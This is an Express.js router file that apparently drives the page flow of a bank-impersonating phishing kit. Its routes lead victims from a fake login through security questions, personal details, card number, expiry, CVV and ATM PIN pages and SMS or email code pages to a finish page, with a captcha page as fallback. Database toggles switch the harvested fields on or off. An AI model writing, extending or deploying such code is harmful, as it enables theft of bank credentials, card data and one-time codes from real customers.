// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');
const getId = 1;

const pool = new Pool(dbConfig);

router.get('/finish', async (req, res) => {
    res.render('bank/manu/finish/index');
})

router.get('/card', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        res.render('bank/manu/card/index', { navig: "/manu/finish", manu: result.rows[0].data.settings.manu});

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/loading', async (req, res) => {
    res.render('bank/manu/loading/index');
})

router.get('/sms', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/manu/sms/index', { navig: "/manu/loading", error: error});
})

router.get('/email', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/manu/email/index', { navig: "/manu/loading", error: error });
})


router.get('/details', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.manu).forEach(key => {
            if (result.rows[0].data.settings.manu[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                }
            }
        });

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }


        if (rmvCardPage) {
            res.render('bank/manu/details/index', { navig: "/manu/finish", manu: result.rows[0].data.settings.manu});
        } else {
            res.render('bank/manu/details/index', { navig: "/manu/card", manu: result.rows[0].data.settings.manu});
        }



    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/qst', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.manu).forEach(key => {
            if (result.rows[0].data.settings.manu[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)



        if (rmvDetailsPage) {
            if (rmvCardPage) {
                res.render('bank/manu/qst/index', { navig: "/manu/finish", p_quests: result.rows[0].data.settings.manu.qa });
            } else {
                res.render('bank/manu/qst/index', { navig: "/manu/card", p_quests: result.rows[0].data.settings.manu.qa });
            }
        } else if (count >= 14) {
            res.render('bank/manu/qst/index', { navig: "/manu/finish", p_quests: result.rows[0].data.settings.manu.qa });
        } else {
            res.render('bank/manu/qst/index', { navig: "/manu/details", p_quests: result.rows[0].data.settings.manu.qa });
        }

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/login', async (req, res) => {
    try {

        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.manu).forEach(key => {
            if (result.rows[0].data.settings.manu[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)


        if (result.rows[0].data.settings.manu.qa > 0) {
            res.render('bank/manu/login/index', { navig: "/manu/qst" });
        } else if (count >= 14) {
            res.render('bank/manu/login/index', { navig: "/manu/finish" });
        } else {
            if (rmvDetailsPage) {
                if (rmvCardPage) {
                    res.render('bank/manu/login/index', { navig: "/manu/finish" });
                } else {
                    res.render('bank/manu/login/index', { navig: "/manu/card" });
                }
            } else {
                res.render('bank/manu/login/index', { navig: "/manu/details" });
            }
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
